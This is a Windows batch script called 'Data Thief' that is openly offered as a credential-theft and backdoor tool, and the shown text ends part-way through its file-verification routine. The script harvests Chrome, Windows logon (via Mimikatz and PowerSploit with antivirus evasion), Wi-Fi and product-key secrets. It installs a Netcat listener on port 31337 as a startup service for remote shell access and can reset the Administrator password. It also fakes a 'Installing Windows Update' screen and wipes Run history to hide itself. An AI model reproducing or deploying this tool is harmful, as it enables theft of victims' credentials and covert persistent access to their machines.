@echo off
REM DT (Data Thief) Author/Writer/Creator: Jack Davies AKA, Lavanoid Volcanic.
REM Features of this program:

REM 	-	Backup Google Chrome Passwords.
REM		-	Backup Windows Logon Passwords (Doesn't work on Windows 8.1).
REM		-	Get directory listings of common document paths such as Music, Pictures etc.
REM		-	Init support, meaning that you can add batch scripts in the "Init" directory so that DT will execute it.
REM		-	[KILLNG/NOT GOING TO ADD] Install Daemon Backdoor, meaning that you can install LVD-Daemon so that it can be used to execute
REM 		system level commands. Useful for bypassing the logon screen. Theres a more detailed documentation
REM		-	in Res\LVD\Documentation.txt.
REM		-	Get a visual notification when program has executed (MSG.exe must be integrated in Windows. Usually not
REM 		available in Windows Home Premium/Home Edition).
REM		-	Get a sound notification when program has executed. This can be configured by editing the configuration
REM 		below.
REM		-	Verbose logging of backup process.
REM		-	Shut-down,reboot or lock system when program execution has completed.
REM		- 	Replace Administrator password every time the program is ran.
REM		-	Wipe the "Run" dialogue history so it seems that nothing was ever ran from it.
REM		-	Read a configuration file instead of editing the DT.bat. Configuration file: DT_Config.dat.
REM		-	Integrated Netcat/Nmap to listen on a port (Used for a remote shell). Thanks Shannon Morse for talking about Netcat so much. Netcat will be installed as a Windows service so it has admin access, and it runs upon Windows startup. Default username and password: Lavanoid (Username), LavanoidVolcanic (Password).
REM		-	Run Mimikatz without AV detection, using PowerSploit to accomplish this - Requested by MB60893. Thank you soooo much MB60893! An internet connection is currently required to run this feature.
REM		-	Listing of workgroups and domains on the local network.
REM		-	Customised NetCat remote command line.

REM		-	Anything else?

REM Other features of this program:

REM		-	Checking of main files located in \Res. Checked with a size verification and Sha1Sum.
REM		-	Added a "API" as I like to call it; to check files with a Sha1Sum verification. Usage:

REM				call :DT_Sha1Sum_Check_Compact "File name/path" "Expected Sha1Sum"

REM		-	No longer need to use SCRIPT_EX.exe.

REM Known issues:

REM		-	Slow at "Backing up" data - this is simply because DT has to extract the required data from a zip archive. An attempt to avoid AV.
REM		-	Some antivirus programs detect compiled batch scripts as a virus. As this is the case, I need to re-write the Netcat service programs.

REM Notes:

REM		-	New features are added in my free time. I'm usually busy so patience is most appreciated.
REM		-	I know I could reduce the total of lines used in this program, but I don't feel the courage to do so. It takes time.

%~d0
CD %~dp0
set DT_DEBUGGING=FALSE
if "%DT_DEBUGGING%"=="TRUE" @echo on
set VAR_DT_CWD=%CD%
set VAR_DT_VER=2.4 - Last updated on: 11 February 2014.
set VAR_PROGRAM_ARCHIVE_PASSWORD=KHJoiy7IkignnmbmnIY986RtJSBIijIUHnjghfHccDtuj
set CON_DT_BKD=%VAR_DT_CWD%\Backups
set CON_DT_BKD_MAIN=%CON_DT_BKD%\%COMPUTERNAME%
set CON_DT_RES_DIRECTORY_ROOT=%VAR_DT_CWD%\Res
set CON_DT_LOG=TRUE
set CON_DT_LOGFILE=%VAR_DT_CWD%\Backups\BackupLog.txt
set CON_DT_CHECK_RES=TRUE
set CON_DT_SOUNDPLAY_0=TRUE
set CON_DT_SOUNDWAVFILE_0=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\0\sound.wav
set CON_DT_SOUNDVBSFILE_0=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\0\sound.vbs
set CON_DT_SOUNDPLAY_1=FALSE
set CON_DT_SOUNDWAVFILE_1=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\1\sound.wav
set CON_DT_SOUNDVBSFILE_1=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\1\sound.vbs
set CON_DT_SOUNDPLAY_2=FALSE
set CON_DT_SOUNDWAVFILE_2=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\2\sound.wav
set CON_DT_SOUNDVBSFILE_2=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\2\sound.vbs
set CON_DT_SOUNDPLAY_3=FALSE
set CON_DT_SOUNDWAVFILE_3=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\3\sound.wav
set CON_DT_SOUNDVBSFILE_3=%CON_DT_RES_DIRECTORY_ROOT%\Res\Sounds\3\sound.vbs
set CON_DT_SOUNDPLAY_4=FALSE
set CON_DT_SOUNDWAVFILE_4=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\4\sound.wav
set CON_DT_SOUNDVBSFILE_4=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\4\sound.vbs
REM Options for the variable "CON_DT_AFTER_EXECUTION_COMMAND": 0 = Nothing, 1 = Lock system, 2 = Shutdown system, 3 = Reboot system.
set CON_DT_AFTER_EXECUTION_COMMAND=0
set CON_DT_BACKUP_WIFI_KEYS=TRUE
set CON_DT_BACKUP_WIFI_KEYS_PATH=%CON_DT_BKD_MAIN%\WiFi
set CON_DT_BACKUP_CHROME_DATA=TRUE
set CON_DT_BACKUP_CHROME_DATA_PATH=%CON_DT_BKD_MAIN%\Chrome
set CON_DT_BACKUP_CHROME_DATA_FILE=ChromePass.txt
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS=TRUE
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH=%CON_DT_BKD_MAIN%\WinPass
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE=Windows_Passwords.txt
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE_DMP=Windows_Passwords.dmp
REM Options for the variable "CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD": 0 - Procdump (Slower, but AV safe), 1 - Mimikatz (Faster, but not AV safe), 2 - Both Procdump and Mimikatz, 3 - PowerSploit Mimikatz RAM injection.
set CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_METHOD=3
set CON_DT_BACKUP_PRODUCT_KEYS=TRUE
set CON_DT_BACKUP_PRODUCT_KEYS_PATH=%CON_DT_BKD_MAIN%\ProdKeys
set CON_DT_BACKUP_PRODUCT_KEYS_FILE=Product_Keys.txt
set CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY=FALSE
set CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_PATH=%CON_DT_BKD_MAIN%\ProdKeys
set CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY_FILE=Produkey_Keys.txt
set CON_DT_BACKUP_DIRECTORY_LISTINGS=TRUE
set CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH=%CON_DT_BKD_MAIN%\DirListings
set CON_DT_BACKUP_DIRECTORY_LISTINGS_FILE=Directory_Listings.txt
set CON_DT_BACKUP_VARIABLE_LISTINGS=TRUE
set CON_DT_BACKUP_VARIABLE_LISTINGS_PATH=%CON_DT_BKD_MAIN%\VarListings
set CON_DT_BACKUP_VARIABLE_LISTINGS_FILE=Variable_Listings.txt
set CON_DT_LIST_WORKGROUPS_AND_DOMAINS=TRUE
set CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH=%CON_DT_BKD_MAIN%\Other
set CON_DT_LIST_WORKGROUPS_AND_DOMAINS_FILE=Domains.N.Workgroups.txt
set CON_DT_MESSAGE_SHOW_AFTER_EXECUTION=FALSE
set CON_DT_MESSAGE_SHOW_AFTER_EXECUTION_MESSAGE=Execution complete!
set CON_DT_CHANGE_ADMIN_PASSWORD=FALSE
set CON_DT_CHANGE_ADMIN_PASSWORD_TO=Hak5_Admin_Password
set CON_DT_INIT_USE_SCRIPTS=TRUE
set CON_DT_INIT_SCRIPTS_DIRECTORY=%VAR_DT_CWD%\Init
set CON_DT_CREATE_DIRECTORY_0=%CON_DT_BKD%
set CON_DT_CREATE_DIRECTORY_1=%CON_DT_RES_DIRECTORY_ROOT%
set CON_DT_CREATE_DIRECTORY_2=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\0
set CON_DT_CREATE_DIRECTORY_3=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\1
set CON_DT_CREATE_DIRECTORY_4=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\2
set CON_DT_CREATE_DIRECTORY_5=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\3
set CON_DT_CREATE_DIRECTORY_6=%CON_DT_RES_DIRECTORY_ROOT%\Sounds\4
set CON_DT_CREATE_DIRECTORY_7=%CON_DT_INIT_SCRIPTS_DIRECTORY%
set CON_DT_CREATE_DIRECTORY_8=%CON_DT_BKD_MAIN%
set CON_DT_CREATE_DIRECTORY_9=%CON_DT_BACKUP_WIFI_KEYS_PATH%
set CON_DT_CREATE_DIRECTORY_10=%CON_DT_BACKUP_CHROME_DATA_PATH%
set CON_DT_CREATE_DIRECTORY_11=%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%
set CON_DT_CREATE_DIRECTORY_12=%CON_DT_BACKUP_DIRECTORY_LISTINGS_PATH%
set CON_DT_CREATE_DIRECTORY_13=%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%
set CON_DT_CREATE_DIRECTORY_14=%CON_DT_BACKUP_PRODUCT_KEYS_PATH%
set CON_DT_CREATE_DIRECTORY_15=%CON_DT_BKD_MAIN%\Other
set CON_DT_CREATE_DIRECTORY_16=%CON_DT_LIST_WORKGROUPS_AND_DOMAINS_PATH%
set CON_DT_CLEANUP_SCRIPT_0=if exist "%VAR_DT_CWD%\invis.vbs" del /f "%VAR_DT_CWD%\invis.vbs"
set CON_DT_CLEANUP_SCRIPT_1=if exist "%TEMP%\DS.bat" del /f "%TEMP%\DS.bat"
set CON_DT_CLEANUP_SCRIPT_2=if exist "%VAR_DT_CWD%\elevate.vbs" del /f "%VAR_DT_CWD%\elevate.vbs"
set CON_DT_ERASE_RUN_HISTORY=TRUE
set CON_DT_NETCAT_USE=TRUE
set CON_DT_NETCAT_SERVICE_PROGRAM=Netcat_Script.bat
set CON_DT_NETCAT_NCAT_EXECUTABLE=ncat.exe
set CON_DT_NETCAT_LISTEN_PORT=31337
set CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL=TRUE
set CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL_NAME=NCAT
set CON_DT_NETCAT_FIREWALL_ENTRY_INSTALL_PORT_TCP_NAME=NCATTCP
set CON_DT_NETCAT_LISTEN_PROGRAM=Terminal.bat
set CON_DT_NETCAT_LISTEN_PROGRAM_UPDATE=TRUE
set CON_DT_NETCAT_COPY_TO_PATH=%SystemRoot%\nc
REM Call configuration file:
if exist "%TEMP%\DT_Config.bat" del /f "%TEMP%\DT_Config.bat" >nul
if exist "%VAR_DT_CWD%\DT_Config.dat" copy /Y /V "%VAR_DT_CWD%\DT_Config.dat" "%TEMP%\DT_Config.bat" >nul
if exist "%TEMP%\DT_Config.bat" call "%TEMP%\DT_Config.bat" >nul
if exist "%TEMP%\DT_Config.bat" del /f "%TEMP%\DT_Config.bat" >nul
REM The variable "VAR_DT_ERROR_EXIT" MUST remain as "FALSE" (Without the quotes). Failure to do so may cause the script to execute incorrectly.
set VAR_DT_ERROR_EXIT=FALSE
:DT_Start
Title = Installing Windows Update...
color F0
cls
@echo Installing Windows Update...
REM Create directories ----------------------------------------------------------------------------
if "%CON_DT_LOG%"=="TRUE" call :DT_Create_Directories_With_Logging
if not "%CON_DT_LOG%"=="TRUE" call :DT_Create_Directories_Without_Logging
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
REM Logging start ---------------------------------------------------------------------------------
if "%CON_DT_LOG%"=="TRUE" @echo ------------------------------------------------------------------- >> "%CON_DT_LOGFILE%"
if "%CON_DT_LOG%"=="TRUE" @echo Backup started on system "%COMPUTERNAME%" at %TIME% on %DATE%. >> "%CON_DT_LOGFILE%"
if "%CON_DT_LOG%"=="TRUE" @echo Program version: %VAR_DT_VER% >> "%CON_DT_LOGFILE%"
REM Run file verifications ------------------------------------------------------------------------
if not "%CON_DT_CHECK_RES%"=="TRUE" goto DT_NONCALL_VERIFY_SYSTEM
if "%CON_DT_LOG%"=="TRUE" @echo Running file verifications... >> "%CON_DT_LOGFILE%"
call :DT_Run_File_Verifications
if exist "%CON_DT_RES_DIRECTORY_ROOT%\PowerSploit\PowerSploit-master-Encrypted.zip" call :DT_Sha1Sum_Check_Compact "%CON_DT_RES_DIRECTORY_ROOT%\PowerSploit\PowerSploit-master-Encrypted.zip" "e30cbe65f51688060c0d4b264861c4d0845025ba"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\ncat.exe" call :DT_Sha1Sum_Check_Compact "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\ncat.exe" "e52433b84341f1bec29dc818b48132c045311a1f"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\Execute_ncstart.exe" call :DT_Sha1Sum_Check_Compact "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\Execute_ncstart.exe" "fd8c658c968b0f6bdb3f5c9d28aa903bb5a080a9"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\ncstart.exe" call :DT_Sha1Sum_Check_Compact "%CON_DT_RES_DIRECTORY_ROOT%\NetCat-Nmap\Startup_Scripts\ncstart.exe" "96b5c58fba203f9c54ed322c4f5998465f131056"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
REM Verify system ---------------------------------------------------------------------------------
:DT_NONCALL_VERIFY_SYSTEM
call :DT_Verify_System
REM Let the fun begin -----------------------------------------------------------------------------
if "%CON_DT_LIST_WORKGROUPS_AND_DOMAINS%"=="TRUE" call :DT_Backup_Workgroup_And_Domain_Listings
if "%CON_DT_BACKUP_PRODUCT_KEYS%"=="TRUE" call :DT_Backup_Product_Keys
if "%CON_DT_BACKUP_PRODUCT_KEYS_WITH_PRODUKEY%"=="TRUE" call :DT_Backup_Product_Keys_Produkey
if "%CON_DT_BACKUP_WIFI_KEYS%"=="TRUE" call :DT_Backup_WiFi_Keys "%CON_DT_BACKUP_WIFI_KEYS_PATH%"
if "%CON_DT_BACKUP_DIRECTORY_LISTINGS%"=="TRUE" call :DT_Backup_Directory_Listings
color F0
cls
@echo Installing Windows Update...
if "%CON_DT_BACKUP_VARIABLE_LISTINGS%"=="TRUE" (
if "%CON_DT_LOG%"=="TRUE" @echo Writing variable listings... >> "%CON_DT_LOGFILE%"
set >> "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%\%CON_DT_BACKUP_VARIABLE_LISTINGS_FILE%"
)
if exist "%CON_DT_BACKUP_VARIABLE_LISTINGS_PATH%\%CON_DT_BACKUP_VARIABLE_LISTINGS_FILE%" (
if "%CON_DT_LOG%"=="TRUE" @echo Variable listing complete. >> "%CON_DT_LOGFILE%"
)
color F0
cls
@echo Installing Windows Update...
Title = Installing Windows Update...
if "%CON_DT_BACKUP_CHROME_DATA%"=="TRUE" call :DT_Backup_Chrome_Data "%CON_DT_BACKUP_CHROME_DATA_PATH%\%CON_DT_BACKUP_CHROME_DATA_FILE%"
if "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS%"=="TRUE" call :DT_Backup_Windows_Passwords "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_PATH%" "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE%" "%CON_DT_BACKUP_WINDOWS_LOGIN_PASSWORDS_FILE_DMP%"
REM Init scripts execution ---------------------------------------------------------------------
cls
@echo Installing Windows Update...
Title = Installing Windows Update...
if "%CON_DT_INIT_USE_SCRIPTS%"=="TRUE" call :DT_Execute_Init_Scripts >nul
cls
@echo Installing Windows Update...
Title = Installing Windows Update...
REM Program end --------------------------------------------------------------------------------
if "%CON_DT_MESSAGE_SHOW_AFTER_EXECUTION%"=="TRUE" MSG * %CON_DT_MESSAGE_SHOW_AFTER_EXECUTION_MESSAGE%
REM Sound scripts ------------------------------------------------------------------------------
if exist "%CON_DT_SOUNDVBSFILE_0%" del /f "%CON_DT_SOUNDVBSFILE_0%" >nul
if "%CON_DT_SOUNDPLAY_0%"=="TRUE" call :DT_Sound_Play "%CON_DT_SOUNDWAVFILE_0%" "%CON_DT_SOUNDVBSFILE_0%"
if "%CON_DT_SOUNDPLAY_1%"=="TRUE" call :DT_Sound_Play "%CON_DT_SOUNDWAVFILE_1%" "%CON_DT_SOUNDVBSFILE_1%"
if "%CON_DT_SOUNDPLAY_2%"=="TRUE" call :DT_Sound_Play "%CON_DT_SOUNDWAVFILE_2%" "%CON_DT_SOUNDVBSFILE_2%"
if "%CON_DT_SOUNDPLAY_3%"=="TRUE" call :DT_Sound_Play "%CON_DT_SOUNDWAVFILE_3%" "%CON_DT_SOUNDVBSFILE_3%"
if "%CON_DT_SOUNDPLAY_4%"=="TRUE" call :DT_Sound_Play "%CON_DT_SOUNDWAVFILE_4%" "%CON_DT_SOUNDVBSFILE_4%"
REM Cleanup scripts ----------------------------------------------------------------------------
if "%CON_DT_LOG%"=="TRUE" @echo Running cleanup scripts ([%CON_DT_CLEANUP_SCRIPT_0%], [%CON_DT_CLEANUP_SCRIPT_1%] and [%CON_DT_CLEANUP_SCRIPT_2%]) >> "%CON_DT_LOGFILE%"
%CON_DT_CLEANUP_SCRIPT_0%
%CON_DT_CLEANUP_SCRIPT_1%
%CON_DT_CLEANUP_SCRIPT_2%
if "%CON_DT_ERASE_RUN_HISTORY%"=="TRUE" REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /VA /F
"RUNDLL32.EXE" user32.dll,UpdatePerUserSystemParameters
if "%CON_DT_LOG%"=="TRUE" @echo Running configured exit method (Option No. %CON_DT_AFTER_EXECUTION_COMMAND%) >> "%CON_DT_LOGFILE%"
if "%CON_DT_LOG%"=="TRUE" @echo Exit methods: 0 - Nothing, 1 - Lock system, 2 - Shutdown system, 3 - Reboot system. >> "%CON_DT_LOGFILE%"
if "%CON_DT_LOG%"=="TRUE" @echo DT finished executing. Good bye! >> "%CON_DT_LOGFILE%"
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="1" "rundll32.exe" user32.dll, LockWorkStation
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="2" shutdown -s -f -t 00
if "%CON_DT_AFTER_EXECUTION_COMMAND%"=="3" shutdown -r -f -t 00
goto force_the_end_of_time
REM ---------------------------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------
REM CALLED EVENTS BELOW: ------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------
REM ---------------------------------------------------------------------------------------------
:DT_Create_Directories_Without_Logging
if not exist "%CON_DT_BKD%" mkdir "%CON_DT_BKD%"
if not exist "%CON_DT_BKD%" set VAR_DT_ERROR_EXIT=TRUE
if not exist "%CON_DT_BKD%" goto the_end_of_time
if not exist "%CON_DT_CREATE_DIRECTORY_0%" mkdir "%CON_DT_CREATE_DIRECTORY_0%"
if not exist "%CON_DT_CREATE_DIRECTORY_1%" mkdir "%CON_DT_CREATE_DIRECTORY_1%"
if not exist "%CON_DT_CREATE_DIRECTORY_2%" mkdir "%CON_DT_CREATE_DIRECTORY_2%"
if not exist "%CON_DT_CREATE_DIRECTORY_3%" mkdir "%CON_DT_CREATE_DIRECTORY_3%"
if not exist "%CON_DT_CREATE_DIRECTORY_4%" mkdir "%CON_DT_CREATE_DIRECTORY_4%"
if not exist "%CON_DT_CREATE_DIRECTORY_5%" mkdir "%CON_DT_CREATE_DIRECTORY_5%"
if not exist "%CON_DT_CREATE_DIRECTORY_6%" mkdir "%CON_DT_CREATE_DIRECTORY_6%"
if not exist "%CON_DT_CREATE_DIRECTORY_7%" mkdir "%CON_DT_CREATE_DIRECTORY_7%"
if not exist "%CON_DT_CREATE_DIRECTORY_8%" mkdir "%CON_DT_CREATE_DIRECTORY_8%"
if not exist "%CON_DT_CREATE_DIRECTORY_9%" mkdir "%CON_DT_CREATE_DIRECTORY_9%"
if not exist "%CON_DT_CREATE_DIRECTORY_10%" mkdir "%CON_DT_CREATE_DIRECTORY_10%"
if not exist "%CON_DT_CREATE_DIRECTORY_11%" mkdir "%CON_DT_CREATE_DIRECTORY_11%"
if not exist "%CON_DT_CREATE_DIRECTORY_12%" mkdir "%CON_DT_CREATE_DIRECTORY_12%"
if not exist "%CON_DT_CREATE_DIRECTORY_13%" mkdir "%CON_DT_CREATE_DIRECTORY_13%"
if not exist "%CON_DT_CREATE_DIRECTORY_14%" mkdir "%CON_DT_CREATE_DIRECTORY_14%"
if not exist "%CON_DT_CREATE_DIRECTORY_15%" mkdir "%CON_DT_CREATE_DIRECTORY_15%"
if not exist "%CON_DT_CREATE_DIRECTORY_16%" mkdir "%CON_DT_CREATE_DIRECTORY_16%"
goto the_end_of_time
:DT_Create_Directories_With_Logging
if not exist "%CON_DT_BKD%" mkdir "%CON_DT_BKD%"
if not exist "%CON_DT_BKD%" @echo Failed to create the directory "%CON_DT_BKD%", this is also why this log file is stored here. Date and time of occurance: %DATE%, %TIME% >> "%VAR_DT_CWD%\Directory_Error_Log.txt"
if not exist "%CON_DT_BKD%" @echo Data Thief cannot be executed without the company of "%CON_DT_BKD%". Exiting... "%VAR_DT_CWD%\Directory_Error_Log.txt"
if not exist "%CON_DT_BKD%" set VAR_DT_ERROR_EXIT=TRUE
if not exist "%CON_DT_BKD%" goto the_end_of_time
if not exist "%CON_DT_CREATE_DIRECTORY_0%" mkdir "%CON_DT_CREATE_DIRECTORY_0%"
if not exist "%CON_DT_CREATE_DIRECTORY_0%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_0%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_1%" mkdir "%CON_DT_CREATE_DIRECTORY_1%"
if not exist "%CON_DT_CREATE_DIRECTORY_1%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_1%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_2%" mkdir "%CON_DT_CREATE_DIRECTORY_2%"
if not exist "%CON_DT_CREATE_DIRECTORY_2%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_2%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_3%" mkdir "%CON_DT_CREATE_DIRECTORY_3%"
if not exist "%CON_DT_CREATE_DIRECTORY_3%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_3%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_4%" mkdir "%CON_DT_CREATE_DIRECTORY_4%"
if not exist "%CON_DT_CREATE_DIRECTORY_4%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_4%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_5%" mkdir "%CON_DT_CREATE_DIRECTORY_5%"
if not exist "%CON_DT_CREATE_DIRECTORY_5%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_5%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_6%" mkdir "%CON_DT_CREATE_DIRECTORY_6%"
if not exist "%CON_DT_CREATE_DIRECTORY_6%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_6%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_7%" mkdir "%CON_DT_CREATE_DIRECTORY_7%"
if not exist "%CON_DT_CREATE_DIRECTORY_7%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_7%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_8%" mkdir "%CON_DT_CREATE_DIRECTORY_8%"
if not exist "%CON_DT_CREATE_DIRECTORY_8%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_8%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_9%" mkdir "%CON_DT_CREATE_DIRECTORY_9%"
if not exist "%CON_DT_CREATE_DIRECTORY_9%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_9%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_10%" mkdir "%CON_DT_CREATE_DIRECTORY_10%"
if not exist "%CON_DT_CREATE_DIRECTORY_10%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_10%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_11%" mkdir "%CON_DT_CREATE_DIRECTORY_11%"
if not exist "%CON_DT_CREATE_DIRECTORY_11%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_11%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_12%" mkdir "%CON_DT_CREATE_DIRECTORY_12%"
if not exist "%CON_DT_CREATE_DIRECTORY_12%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_12%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_13%" mkdir "%CON_DT_CREATE_DIRECTORY_13%"
if not exist "%CON_DT_CREATE_DIRECTORY_13%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_13%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_14%" mkdir "%CON_DT_CREATE_DIRECTORY_14%"
if not exist "%CON_DT_CREATE_DIRECTORY_14%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_14%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_15%" mkdir "%CON_DT_CREATE_DIRECTORY_15%"
if not exist "%CON_DT_CREATE_DIRECTORY_15%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_15%"! >> "%CON_DT_LOGFILE%"
if not exist "%CON_DT_CREATE_DIRECTORY_16%" mkdir "%CON_DT_CREATE_DIRECTORY_16%"
if not exist "%CON_DT_CREATE_DIRECTORY_16%" @echo Failed to create the directory "%CON_DT_CREATE_DIRECTORY_16%"! >> "%CON_DT_LOGFILE%"
goto the_end_of_time
:DT_Run_File_Verifications
if exist "%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\Sha1Sum\sha1sum.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.dll" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.dll"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.sfx" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7z.sfx"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7zCon.sfx" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7zCon.sfx"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7-zip.dll" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\7-Zip\7-zip.dll"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\ChromePass\ChromePass.zip"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\kappfree.dll"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x32\mimikatz_x32.zip"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.exe"
if "%VAR_DT_ERROR_EXIT%"=="TRUE" goto force_the_end_of_time
if exist "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip" call :DT_Check_File "%CON_DT_RES_DIRECTORY_ROOT%\mimikatz_x64\mimikatz_x64.zip"
